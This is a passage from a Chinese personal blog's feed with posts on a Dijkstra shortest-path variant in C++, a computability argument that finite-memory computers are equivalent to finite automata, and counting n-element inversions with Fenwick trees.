class="line"><span class="keyword">int</span> vertexCnt, edgeCnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> weight[][<span class="number">600</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">bool</span> isLength)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outp</span><span class="params">(<span class="keyword">int</span> f, <span class="keyword">int</span> index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                TIME[i][j] = INF;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                length[i][j] = INF;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            v[i].index = i;</span><br><span class="line">            v[i].adj.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tp[i].clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vertexCnt = n, edgeCnt = m;</span><br><span class="line">        <span class="keyword">int</span> v1, v2, one, l, t;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d%d"</span>, &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t);</span><br><span class="line">            v[v1].adj.push_back(v2);</span><br><span class="line">            <span class="comment">// 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可</span></span><br><span class="line">            length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l;</span><br><span class="line">            TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t;</span><br><span class="line">            <span class="keyword">if</span> (!one) &#123;</span><br><span class="line">                v[v2].adj.push_back(v1);</span><br><span class="line">                length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l;</span><br><span class="line">                TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;BEGIN, &amp;END);</span><br><span class="line">        <span class="keyword">if</span> (BEGIN == END) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span></span><br><span class="line">                 &lt;&lt; <span class="string">"0"</span></span><br><span class="line">                 &lt;&lt; <span class="string">"; Distance = "</span></span><br><span class="line">                 &lt;&lt; <span class="string">"0"</span></span><br><span class="line">                 &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class="string">" =&gt; "</span> &lt;&lt; END &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; TIME[BEGIN][END] &lt;&lt; <span class="string">"; Distance = "</span> &lt;&lt; length[BEGIN][END] &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class="string">" =&gt; "</span> &lt;&lt; END &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> timeEND = dijstra(TIME);</span><br><span class="line"><span class="comment">//        outp(END, 0);</span></span><br><span class="line">        DFS(<span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; r1, r2;</span><br><span class="line">        r1.push_back(END);</span><br><span class="line">        <span class="comment">// 以下这种构造路径的方式是建立在起点不同于终点的情况下</span></span><br><span class="line">        <span class="keyword">int</span> tmp_tp = tpResult[END];</span><br><span class="line">        r1.push_back(tmp_tp);</span><br><span class="line">        <span class="keyword">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class="line">            tmp_tp = tpResult[tmp_tp];</span><br><span class="line">            r1.push_back(tmp_tp);</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(r1.begin(), r1.end());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tp[i].clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lenEND = dijstra(length);</span><br><span class="line"><span class="comment">//        outp(END, 0);</span></span><br><span class="line">        DFS(<span class="literal">true</span>);</span><br><span class="line">        r2.push_back(END);</span><br><span class="line">        tmp_tp = tpResult[END];</span><br><span class="line">        r2.push_back(tmp_tp);</span><br><span class="line">        <span class="keyword">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class="line">            tmp_tp = tpResult[tmp_tp];</span><br><span class="line">            r2.push_back(tmp_tp);</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(r2.begin(), r2.end());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> isSame = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (r1.size() == r2.size()) &#123;</span><br><span class="line">            isSame = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size(); i++) &#123;</span><br><span class="line">                isSame = (r1[i] == r2[i]) &amp;&amp; isSame;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isSame) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; timeEND &lt;&lt; <span class="string">"; Distance = "</span> &lt;&lt; lenEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r1[r1.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Time = "</span> &lt;&lt; timeEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r1.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r1[r1.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Distance = "</span> &lt;&lt; lenEND &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r2.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; r2[i] &lt;&lt; <span class="string">" =&gt; "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; r2[r2.size() - <span class="number">1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> me;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    Edge_t(<span class="keyword">int</span> m, <span class="keyword">int</span> h, <span class="keyword">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Edge_t &amp;x) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x.t &lt; <span class="keyword">this</span>-&gt;t; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bfs+优先队列其实就是dijstra算法</span></span><br><span class="line"><span class="comment">// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到</span></span><br><span class="line"><span class="comment">// 所以result set只会有node被加进去而不会有node被踢出去</span></span><br><span class="line"><span class="comment">// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> weight[][<span class="number">600</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> resWei[<span class="number">600</span>];</span><br><span class="line">    priority_queue&lt;Edge_t&gt; que;</span><br><span class="line">    que.push(Edge_t(BEGIN, <span class="number">0</span>, <span class="number">0</span>));<span class="comment">// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0</span></span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> visit[vertexCnt];  <span class="comment">// 记录某点是否已经加入到dijstra的result set里</span></span><br><span class="line">    <span class="built_in">memset</span>(visit, <span class="number">0</span>, <span class="keyword">sizeof</span>(visit) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line">    <span class="keyword">while</span> (!que.empty()) &#123;</span><br><span class="line">        Edge_t t = que.top();</span><br><span class="line">        que.pop();</span><br><span class="line">        <span class="comment">// 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里</span></span><br><span class="line">        <span class="keyword">if</span> (visit[t.me]) &#123;</span><br><span class="line">            assert(resWei[t.me] &lt;= t.t);</span><br><span class="line">            <span class="keyword">if</span> (resWei[t.me] == t.t) &#123;</span><br><span class="line">                tp[t.me].push_back(t.p);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[t.me] = <span class="literal">true</span>;</span><br><span class="line">        tp[t.me].push_back(t.p);</span><br><span class="line">        resWei[t.me] = t.t;</span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;adj = v[t.me].adj;</span><br><span class="line">        <span class="keyword">int</span> al = adj.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; al; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj[i] == t.me)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resWei[END];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">bool</span> dpVisit[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __dfs(<span class="keyword">int</span> f, <span class="keyword">bool</span> isLength);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">bool</span> isLength)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0xff</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="built_in">memset</span>(tpResult, <span class="number">0</span>, <span class="keyword">sizeof</span>(tpResult));</span><br><span class="line">    <span class="built_in">memset</span>(dpVisit, <span class="number">0</span>, <span class="keyword">sizeof</span>(dpVisit));</span><br><span class="line">    <span class="keyword">return</span> __dfs(END, isLength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __dfs(<span class="keyword">int</span> f, <span class="keyword">bool</span> isLength) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[f] &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[f];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f == BEGIN) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;t = tp[f];</span><br><span class="line">    <span class="keyword">int</span> result = INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==f)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (dpVisit[t[i]])  <span class="comment">// 代表该节点在这条路径上已经被访问过</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        dpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> p = __dfs(t[i], isLength) + (isLength ? <span class="number">1</span> : length[t[i]][f]);</span><br><span class="line">        dpVisit[f] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &lt; result) &#123;</span><br><span class="line">            tpResult[f] = t[i];</span><br><span class="line">            result = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[f] = result;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> path[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">bool</span> outpVisit[<span class="number">600</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outp</span><span class="params">(<span class="keyword">int</span> f, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    outpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (f == BEGIN) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"outp: "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; path[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        outpVisit[f] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[index] = f;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;t = tp[f];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (outpVisit[t[i]])<span class="comment">// means that 前辈们已经访问过了，再访问就成环了</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        outp(t[i], index + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    outpVisit[f] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Dijstra最短路变形
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="Dijstra最短路" scheme="https://h-zex.github.io/tags/Dijstra%E6%9C%80%E7%9F%AD%E8%B7%AF/"/>
    
      <category term="天梯赛" scheme="https://h-zex.github.io/tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>有限存储的计算机等价于有限自动机（DFA、NFA）</title>
    <link href="https://h-zex.github.io/2018/05/11/%E6%9C%89%E9%99%90%E5%AD%98%E5%82%A8%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AD%89%E4%BB%B7%E4%BA%8E%E6%9C%89%E9%99%90%E8%87%AA%E5%8A%A8%E6%9C%BA%EF%BC%88DFA%E3%80%81NFA%EF%BC%89/"/>
    <id>https://h-zex.github.io/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/</id>
    <published>2018-05-11T08:13:18.000Z</published>
    <updated>2019-07-02T15:43:51.337Z</updated>
    
    <content type="html"><![CDATA[<h3 id="B-0-n1-n-n-ge0"><a href="#B-0-n1-n-n-ge0" class="headerlink" title="$B=\{0^n1^n|n\ge0\}$"></a>$B=\{0^n1^n|n\ge0\}$</h3><ul><li>Michael Sipser 的 <em>Introduction to the Theory of Computation</em> 的1.4提到一个非正则语言的例子，$B=\{0^n1^n|n\ge0\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别</li><li>但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢</li><li>事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\{0^n1^m|n\ mod\ max=m\ mod\ max\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值</li><li>如果是n处于一定范围内，容易构造出一台DFA识别B：<ul><li>设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量</li><li>那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集</li><li>转移方程为<ul><li>首先： $&lt;0,0&gt;\rightarrow&lt;1,0&gt;\rightarrow&lt;2,0&gt;\rightarrow…\rightarrow&lt;1000,0&gt;$</li><li>然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$</li><li>然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值</li><li>最后：一旦转移到 $&lt;n, n&gt;$ 就accept</li></ul></li></ul></li></ul><h3 id="为什么现实中的计算机有可能是DFA"><a href="#为什么现实中的计算机有可能是DFA" class="headerlink" title="为什么现实中的计算机有可能是DFA"></a>为什么现实中的计算机有可能是DFA</h3><ul><li>计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能</li></ul><h3 id="对任意一段代码构造等价的NFA"><a href="#对任意一段代码构造等价的NFA" class="headerlink" title="对任意一段代码构造等价的NFA"></a>对任意一段代码构造等价的NFA</h3><h5 id="NFA构造方法描述"><a href="#NFA构造方法描述" class="headerlink" title="NFA构造方法描述"></a>NFA构造方法描述</h5><ul><li>假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）</li></ul><ul><li>输入字符表是$\{0,1\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。</li></ul><ul><li>假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态</li><li>假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state</li><li>该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\varepsilon$ </li></ul><h5 id="为什么该NFA只接受允许的字符串，而不会接受多余的字符串"><a href="#为什么该NFA只接受允许的字符串，而不会接受多余的字符串" class="headerlink" title="为什么该NFA只接受允许的字符串，而不会接受多余的字符串"></a>为什么该NFA只接受允许的字符串，而不会接受多余的字符串</h5><ul><li>首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串</li><li>设置一个新的起始态，该起始态有$\varepsilon$ 到所有为每个字符串构造的NFA</li><li>则最终的NFA只接受允许的字符串</li></ul><h5 id="是否会出现情况：代码两次处于某状态但是行为不一样"><a href="#是否会出现情况：代码两次处于某状态但是行为不一样" class="headerlink" title="是否会出现情况：代码两次处于某状态但是行为不一样"></a>是否会出现情况：代码两次处于某状态但是行为不一样</h5><ul><li>答案是肯定不会</li><li>计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的</li></ul><h3 id="对任意一台计算机构造等价的DFA"><a href="#对任意一台计算机构造等价的DFA" class="headerlink" title="对任意一台计算机构造等价的DFA"></a>对任意一台计算机构造等价的DFA</h3><ul><li>对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算</li><li>先说明一些前置情况：<ul><li>现实中计算机使用源码处理特定的输入</li><li>把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M</li></ul></li><li>因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA</li><li>然后开始构造DFA<ul><li>该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个</li><li>DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态</li><li>第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态</li></ul></li><li>从而该DFA接受$\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合</li></ul><h3 id="计算机可以死循环，DFA不会死循环，为什么"><a href="#计算机可以死循环，DFA不会死循环，为什么" class="headerlink" title="计算机可以死循环，DFA不会死循环，为什么"></a>计算机可以死循环，DFA不会死循环，为什么</h3><ul><li>consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。</li></ul><ul><li><p>因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。</p></li><li><p>在NFA，这种情况死循环的状况也会发生——一组状态以$\varepsilon$ 连接在一起形成环，从而导致无限读入$\varepsilon$ ，无限循环</p></li><li><p>截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变</p></li><li><p>而按照<em>Introduction to the Theory of Computation</em> 的1.2节的<em>EQUIVALENCE OF NFAS AND DFAS</em>DFA 描述的方法，其正是去掉了这种$\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：</p><img src="/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/1.png"><p>$E(R)$ 是一个集合，集合中元素不重复，而$\varepsilon$ 环所到达的状态必然是重复的，所以就把$\varepsilon$ 环断开了</p></li></ul>]]></content>
    
    <summary type="html">
    
      区别于图灵机的无限纸带，现实的计算机只有有限存储，所以其不是TM，而是DFA/NFA
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="DFA" scheme="https://h-zex.github.io/tags/DFA/"/>
    
      <category term="NFA" scheme="https://h-zex.github.io/tags/NFA/"/>
    
      <category term="有限自动机" scheme="https://h-zex.github.io/tags/%E6%9C%89%E9%99%90%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
    
      <category term="计算理论" scheme="https://h-zex.github.io/tags/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>n元逆序对数量求解</title>
    <link href="https://h-zex.github.io/2018/03/20/n%E5%85%83%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E9%87%8F%E6%B1%82%E8%A7%A3/"/>
    <id>https://h-zex.github.io/2018/03/20/n元逆序对数量求解/</id>
    <published>2018-03-19T16:05:01.000Z</published>
    <updated>2019-07-02T15:43:51.841Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下思路都是针对从小到大排序的序列的逆序对</p></blockquote><ul><li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li><li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li><li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li><li>首先看看如何求二元逆序对<ul><li>从左到右扫描序列，对于序列中位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li><li>然后此时，以该x结尾的逆序对的数量就是$\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li><li>那么result的数组的和就是逆序对的数量</li><li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li></ul></li><li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul><li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li><li>求$\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li><li>到最后，result_3就是结果</li></ul></li><li>更多元组的也如此思路</li><li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li><li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li><li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li></ul><blockquote><p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p></blockquote>]]></content>
    
    <summary type="html">
    
      n元逆序对数量求解并利用树状数组优化
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://h-zex.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="树状数组" scheme="https://h-zex.github.io/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>My ITOps Note</title>
    <link href="https://h-zex.github.io/2018/02/02/My-ITOPS-Note/"/>
    <id>https://h-zex.github.io/2018/02/02/My-ITOPS-Note/</id>
    <published>2018-02-02T06:18:30.000Z</published>
    <updated>2019-07-02T15:40:49.091Z</updated>
    
